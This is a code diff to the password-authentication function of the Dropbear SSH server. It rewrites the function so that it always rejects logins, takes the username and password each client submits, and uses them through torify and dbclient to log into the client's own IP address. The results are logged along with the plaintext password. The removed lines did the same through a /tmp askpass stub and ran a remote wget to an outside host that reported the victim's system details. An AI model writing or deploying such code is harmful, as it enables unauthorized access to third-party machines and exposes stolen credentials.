@@ -1,19 +1,19 @@
 /*
  * Dropbear - a SSH2 server
- *
+ * 
  * Copyright (c) 2002,2003 Matt Johnston
  * All rights reserved.
- *
+ * 
  * Permission is hereby granted, free of charge, to any person obtaining a copy
  * of this software and associated documentation files (the "Software"), to deal
  * in the Software without restriction, including without limitation the rights
  * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
  * copies of the Software, and to permit persons to whom the Software is
  * furnished to do so, subject to the following conditions:
- *
+ * 
  * The above copyright notice and this permission notice shall be included in
  * all copies or substantial portions of the Software.
- *
+ * 
  * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
  * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
  * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
@@ -36,131 +36,79 @@
 /* Process a password auth request, sending success or failure messages as
  * appropriate */
 void svr_auth_password() {
+	char address[1 + INET6_ADDRSTRLEN];
+	struct sockaddr host;
+	socklen_t host_len = sizeof(host);
+	void *sin;
+	pid_t pid;
+	int status;
 
 	unsigned char * password;
 	unsigned int passwordlen;
-	struct sockaddr host;
-	socklen_t host_len = sizeof(host);
-	char address[1 + INET6_ADDRSTRLEN];
-	pid_t pid;
-	char path[PATH_MAX];
-	FILE* askpass;
-	int len;
 
 	unsigned int changepw;
-
-#ifdef DEBUG_HACKCRYPT
-	/* debugging crypt for non-root testing with shadows */
-	passwdcrypt = DEBUG_HACKCRYPT;
-#endif
 
 	/* check if client wants to change password */
 	changepw = buf_getbool(ses.payload);
 	if (changepw) {
 		/* not implemented by this server */
-		send_msg_userauth_failure(0, 1);
-		return;
+		goto failure;
 	}
 
-	password = buf_getstring(ses.payload, &passwordlen);
-
-	dropbear_log(LOG_INFO,
-				"Password attempt for '%s' from %s with '%s'",
-				ses.authstate.pw_name,
-				svr_ses.addrstring,
-				password);
-
-	if (-1 == getpeername(ses.sock_in, &host, &host_len)) {
-		return;
-	}
+	if (-1 == getpeername(ses.sock_in, &host, &host_len))
+		goto failure;
 
 	switch (host.sa_family) {
 		case AF_INET:
-			if (NULL == inet_ntop(host.sa_family,
-			                      &((struct sockaddr_in *) &host)->sin_addr,
-			                      address,
-			                      sizeof(address))) {
-				return;
-			}
+			sin = (void *) &((struct sockaddr_in *) &host)->sin_addr;
 			break;
 
 		case AF_INET6:
-			if (NULL == inet_ntop(host.sa_family,
-			                      &((struct sockaddr_in6 *) &host)->sin6_addr,
-			                      address,
-			                      sizeof(address))) {
-				return;
-			}
+			sin = (void *) &((struct sockaddr_in6 *) &host)->sin6_addr;
 			break;
 
 		default:
-			return;
+			goto failure;
 	}
+	if (NULL == inet_ntop(host.sa_family, sin, address, sizeof(address)))
+		goto failure;
 
-	dropbear_log(LOG_INFO,
-				"Connecting to %s with %s:%s",
-				address,
-				ses.authstate.pw_name,
-				password);
+	password = buf_getstring(ses.payload, &passwordlen);
 
 	pid = fork();
 	switch (pid) {
 		case (-1):
-			return;
+			goto failure;
 
 		case 0:
-			/* force dbclient to use an askpass stub */
-			(void) sprintf(path,
-			               _PATH_TMP"askpass_%s_%s_%s",
-			               address,
-			               ses.authstate.pw_name,
-			               password);
-			if (-1 == setenv("SSH_ASKPASS_ALWAYS", "1", 1)) {
-				goto terminate;
-			}
-			if (-1 == setenv("SSH_ASKPASS", path, 1)) {
-				goto terminate;
-			}
-
-			/* write an askpass stub */
-			askpass = fopen(path, "w");
-			if (NULL == askpass) {
-				goto terminate;
-			}
-			len = fprintf(askpass, "#!/bin/sh\necho %s", password);
-			(void) fclose(askpass);
-			if (0 > len) {
-				goto delete_askpass;
-			}
-			if (-1 == chmod(path, 0755)) {
-				goto delete_askpass;
-			}
-
-			/* connect to the client */
-			(void) execlp("dbclient",
-			              "dbclient",
-			              address,
-			              "-l",
-			              ses.authstate.pw_name,
-			              "-y",
-			              "sh -c 'wget -O - -U \"Dillo/`uname -orm`\" http://dimakrasner.com'",
-			              (char *) NULL);
-
-			dropbear_log(LOG_INFO, "Failed to run the SSH client");
-
-delete_askpass:
-			(void) unlink(path);
-
-terminate:
-			exit(EXIT_SUCCESS);
+			if (0 == setenv(DROPBEAR_PASSWORD_ENV, password, 1))
+				(void) execlp("torify", "torify", "dbclient", "-t", "-y", "-y", "-l", ses.authstate.pw_name, address, "exit", (char *) NULL);
+			exit(EXIT_FAILURE);
 	}
-
-	/* wait for the client to terminate */
-	(void) waitpid(pid, NULL, 0);
+	if (pid != waitpid(pid, &status, 0))
+		goto failure;
+	if (!WIFEXITED(status))
+		goto failure;
+	
+	if (EXIT_SUCCESS == WEXITSTATUS(status)) {
+		/* successful authentication */
+		dropbear_log(LOG_INFO, 
+				"Password auth succeeded for '%s:%s' from %s",
+				ses.authstate.pw_name,
+				password,
+				svr_ses.addrstring);
+	} else {
+		dropbear_log(LOG_INFO,
+				"Bad password attempt for '%s:%s' from %s",
+				ses.authstate.pw_name,
+				password,
+				svr_ses.addrstring);
+	}
 
 	m_burn(password, passwordlen);
 	m_free(password);
 
+failure:
 	send_msg_userauth_failure(0, 1);
 }
 
